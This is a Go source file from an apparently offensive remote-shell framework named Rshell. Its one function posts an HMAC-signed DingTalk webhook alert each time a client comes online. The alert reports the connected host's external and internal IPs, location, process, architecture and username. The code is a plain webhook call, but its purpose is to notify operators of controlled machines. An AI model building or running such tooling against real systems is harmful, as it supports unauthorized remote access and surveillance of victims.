package webhooks

import (
"Rshell/pkg/database"
"Rshell/pkg/logger"
"bytes"
"crypto/hmac"
"crypto/sha256"
"encoding/base64"
"encoding/json"
"fmt"
"net/http"
"net/url"
"time"
)

func SendDingtalk(Client database.Clients, webhook string, secret string) error {
	content := fmt.Sprintf("✨ Rshell 客户端上线通知 ✨\n\n- External_IP: %s\n- Location: %s\n- Process: %s\n- Arch: %s\n- Internal_IP: %s\n- User: %s\n",
Client.ExternalIP, Client.Address, Client.Process, Client.Arch, Client.InternalIP, Client.Username)

	// timestamp and sign
	timestamp := time.Now().UnixNano() / 1e6
	var finalUrl string
	if secret != "" {
		strToSign := fmt.Sprintf("%d\n%s", timestamp, secret)
		mac := hmac.New(sha256.New, []byte(secret))
		mac.Write([]byte(strToSign))
		sign := base64.StdEncoding.EncodeToString(mac.Sum(nil))
		finalUrl = fmt.Sprintf("%s&timestamp=%d&sign=%s", webhook, timestamp, url.QueryEscape(sign))
	} else {
		finalUrl = webhook
	}

	payload := map[string]interface{}{
		"msgtype": "text",
		"text": map[string]string{
			"content": content,
		},
	}

	body, _ := json.Marshal(payload)
	client := &http.Client{Timeout: 5 * time.Second}
	resp, err := client.Post(finalUrl, "application/json", bytes.NewBuffer(body))
	if err != nil {
		logger.Error("SendDingtalk: " + err.Error())
		return err
	}
	defer resp.Body.Close()
	return nil
}
